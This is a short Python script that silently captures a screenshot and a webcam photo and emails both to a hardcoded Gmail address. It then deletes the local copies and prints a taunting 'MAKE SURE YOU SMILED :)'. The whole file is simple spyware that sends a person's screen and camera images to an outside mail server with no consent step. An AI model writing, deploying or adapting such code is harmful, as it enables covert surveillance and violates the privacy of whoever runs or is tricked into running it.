import pyautogui
import smtplib
import cv2
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from PIL import Image
import os
import time

def take_screenshot():
    # Take screenshot
    image = pyautogui.screenshot()
    image = image.convert('RGB')
    image.save('screenshot.jpeg')
    return image

def take_webcam_picture():
    webcam_index = 0
    cap = cv2.VideoCapture(webcam_index)
    if cap.isOpened():
        ret, frame = cap.read()
        cap.release()
        # Convert the frame to a PIL image
        image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        image.save('webcam_picture.jpeg')
    return image

def send_email():
    # Create the root message and fill in the from, to, and subject headers
    msg = MIMEMultipart()
    msg['Subject'] = 'Screenshot and Webcam Picture'
    msg['From'] = 'email1@gmail.com'
    msg['To'] = 'email2@gmail.com'

    # Open the screenshot image
    with open('screenshot.jpeg', 'rb') as f:
        screenshot = MIMEImage(f.read())

    # Add the screenshot to the message
    msg.attach(screenshot)

    if os.path.exists('webcam_picture.jpeg'):
        # Open the webcam picture image
        with open('webcam_picture.jpeg', 'rb') as f:
            webcam_picture = MIMEImage(f.read())

        # Add the webcam picture to the message
        msg.attach(webcam_picture)

    # Send the message via our SMTP server
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login('email1@gmail.com', 'password')
    s.sendmail(msg['From'], msg['To'], msg.as_string())
    s.quit()
    
if __name__ == '__main__':
    take_screenshot()
    take_webcam_picture()
    send_email()
    os.remove("screenshot.jpeg")
    os.remove("webcam_picture.jpeg")

print("MAKE SURE YOU SMILED :)")
exit()